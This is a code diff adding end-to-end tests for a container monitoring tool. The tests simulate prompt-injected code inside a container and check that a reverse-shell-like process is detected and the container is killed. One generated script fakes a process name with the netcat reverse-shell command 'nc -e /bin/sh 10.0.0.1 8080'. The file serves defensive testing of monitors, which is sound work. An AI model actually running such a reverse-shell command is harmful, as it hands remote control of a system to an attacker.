@@ -275,11 +275,196 @@ class TestAutomatedResponse:
         cleanup_container(container_name, coi_binary)
 
 
+class TestPromptInjectionScenario:
+    """Test realistic prompt injection scenario - code inside container goes rogue."""
+
+    def test_malicious_script_execution_inside_container(
+        self, test_workspace, enable_monitoring, coi_binary
+    ):
+        """Simulate prompt injection: script inside container executes malicious commands."""
+        # Create a malicious script that simulates prompt-injected code
+        malicious_script = test_workspace / "run_task.py"
+        malicious_script.write_text(
+            """#!/usr/bin/env python3
+# Simulates a tool that got prompt-injected to run malicious commands
+import subprocess
+import time
+
+# Simulate legitimate work first
+print("Processing task...")
+time.sleep(1)
+
+# Then execute malicious command (simulating prompt injection)
+# Using exec -a to fake the process name
+subprocess.Popen(
+    ["sh", "-c", "exec -a 'nc -e /bin/sh 10.0.0.1 8080' sleep 60"],
+    stdout=subprocess.DEVNULL,
+    stderr=subprocess.DEVNULL,
+)
+
+print("Task completed")
+"""
+        )
+        malicious_script.chmod(0o755)
+
+        # Start shell with monitoring enabled
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                str(test_workspace),
+                "--slot",
+                "4",
+                "--monitor",  # Enable monitoring
+            ],
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+        )
+
+        time.sleep(8)
+
+        container_name = get_container_name_from_workspace(str(test_workspace)).replace("-1", "-4")
+
+        if get_container_state(container_name) == "Unknown":
+            proc.terminate()
+            pytest.skip(f"Container {container_name} not found")
+
+        # Execute the malicious script from INSIDE the container (realistic scenario)
+        exec_proc = subprocess.Popen(
+            [
+                "incus",
+                "exec",
+                container_name,
+                "--",
+                "python3",
+                "/workspace/run_task.py",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        # Wait for monitoring to detect the threat
+        time.sleep(5)
+
+        # Container should be killed due to CRITICAL threat
+        killed = False
+        for _ in range(15):
+            time.sleep(1)
+            state = get_container_state(container_name)
+            if state in ["Stopped", "Frozen"]:
+                killed = True
+                break
+
+        # Verify container was killed
+        assert killed, "Container should be auto-killed when inside process goes rogue"
+
+        # Verify threat detected in audit log
+        events = get_threat_events(container_name)
+        critical = [e for e in events if e.get("level") == "critical"]
+        assert len(critical) > 0, "Expected CRITICAL threat event for prompt injection"
+
+        # Verify the threat description mentions reverse shell
+        threat_descriptions = [e.get("threat", "") for e in critical]
+        assert any("reverse shell" in desc.lower() for desc in threat_descriptions), (
+            "Expected reverse shell detection"
+        )
+
+        proc.terminate()
+        exec_proc.terminate()
+        cleanup_container(container_name, coi_binary)
+
+    def test_monitoring_logs_for_warnings(self, test_workspace, enable_monitoring, coi_binary):
+        """Verify monitoring logs contain WARNING messages, not just audit logs."""
+        # Create script that triggers WARNING (not CRITICAL)
+        warning_script = test_workspace / "scan_env.py"
+        warning_script.write_text(
+            """#!/usr/bin/env python3
+import subprocess
+import time
+
+# Simulate environment scanning (WARNING level)
+subprocess.Popen(
+    ["sh", "-c", "exec -a 'env' sleep 30"],
+    stdout=subprocess.DEVNULL,
+    stderr=subprocess.DEVNULL,
+)
+
+time.sleep(60)
+"""
+        )
+        warning_script.chmod(0o755)
+
+        # Start shell and capture stderr (where monitoring logs go)
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                str(test_workspace),
+                "--slot",
+                "5",
+                "--monitor",
+                "--debug",
+            ],
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+        )
+
+        time.sleep(8)
+
+        container_name = get_container_name_from_workspace(str(test_workspace)).replace("-1", "-5")
+
+        if get_container_state(container_name) == "Unknown":
+            proc.terminate()
+            pytest.skip(f"Container {container_name} not found")
+
+        # Run the warning-triggering script
+        subprocess.Popen(
+            [
+                "incus",
+                "exec",
+                container_name,
+                "--",
+                "python3",
+                "/workspace/scan_env.py",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        # Wait for detection
+        time.sleep(5)
+
+        # Container should still be running (WARNING doesn't kill)
+        state = get_container_state(container_name)
+        assert state == "Running", f"Container should stay running on WARNING, got {state}"
+
+        # Verify WARNING in audit log
+        events = get_threat_events(container_name)
+        warnings = [e for e in events if e.get("level") == "warning"]
+        assert len(warnings) > 0, "Expected WARNING event in audit log"
+
+        # Check that audit log has proper structure
+        for warning in warnings:
+            assert "timestamp" in warning, "Audit event missing timestamp"
+            assert "threat" in warning, "Audit event missing threat description"
+            assert "level" in warning, "Audit event missing level"
+
+        proc.terminate()
+        cleanup_container(container_name, coi_binary)
+
+
 # These end-to-end tests verify all monitoring aspects:
 # - Threat detection (reverse shells, env scanning)
 # - Threat levels (CRITICAL, WARNING)
 # - Automated responses (auto-kill, alert-only)
 # - Audit logging
+# - Prompt injection scenarios (code inside container going rogue)
 #
 # Tests use background shell processes and direct container command injection
 # to avoid stdout/stderr blocking issues.
